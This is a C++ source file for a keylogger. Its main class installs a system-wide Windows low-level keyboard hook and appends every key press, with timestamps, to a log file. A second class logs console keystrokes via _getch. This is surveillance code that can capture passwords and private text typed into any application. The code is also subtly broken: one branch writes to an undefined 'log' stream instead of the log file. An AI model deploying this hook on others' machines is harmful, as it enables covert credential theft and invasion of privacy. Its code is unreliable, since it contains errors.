#include "KeyLogger.h"
#include <iostream>
#include <conio.h> 

namespace KeyLog
{
    // KeyLogger implementation
    KeyLogger* KeyLogger::instance = nullptr;

    KeyLogger::KeyLogger() : hHook(nullptr)
    {
        instance = this;
    }

    KeyLogger::~KeyLogger()
    {
        if (hHook) UnhookWindowsHookEx(hHook);
        if (logFile.is_open()) logFile.close();
    }

    LRESULT CALLBACK KeyLogger::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode >= 0 && wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            std::cout << "Tecla presionada: " << static_cast<char>(p->vkCode) << std::endl;
            if (instance)
            {
                instance->logFile << "Tecla presionada: " << static_cast<char>(p->vkCode) << std::endl;
                instance->logFile << "Time: " << p->time << std::endl;
                instance->logFile.flush();
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    bool KeyLogger::start(const std::string& filename)
    {
        logFile.open(filename, std::ios::app);

        if (!logFile.is_open()) return false;

        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
        return hHook != NULL;
    }

    void KeyLogger::run()
    {
        std::cout << "Presiona cualquier tecla para capturar eventos. Presiona ESC para salir." << std::endl;

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // KeyLoggerConio implementation
    KeyLoggerConio::KeyLoggerConio() = default;
    KeyLoggerConio::~KeyLoggerConio() { if (logFile.is_open()) logFile.close(); }

    bool KeyLoggerConio::start(const std::string& filename)
    {
        logFile.open(filename, std::ios::app);
        return logFile.is_open();
    }

    void KeyLoggerConio::run()
    {
        std::cout << "Presiona cualquier tecla para registrar. Presiona 'q' para salir.\n";
        while (true)
        {
            if (_kbhit()) // Verifica si hay una tecla presionada
            {
                char tecla = _getch(); // Captura la tecla presionada
                std::cout << "Key pressed: " << tecla << std::endl;
                if (tecla == 13)
                {
                    logFile << "[ENTER] ";
                }
                else if (tecla == 27)
                {
                    logFile << "[ESC] ";
                    break;
                }
                else if (tecla == 8)
                {
                    logFile << "[BACKSPACE] ";
                }
                else if (tecla == 9)
                {
                    logFile << "[TAB] ";
                }
                else if (tecla == 32)
                {
                    logFile << "[SPACE] ";
                }
                else
                {
                    log << tecla << " "; // Registra la tecla presionada
                }

                // Fuerza el volcado del búfer de salida al archivo
                logFile.flush();
            }
        }

        logFile.close();

        std::cout << "Register has been finished." << std::endl;
    }
}
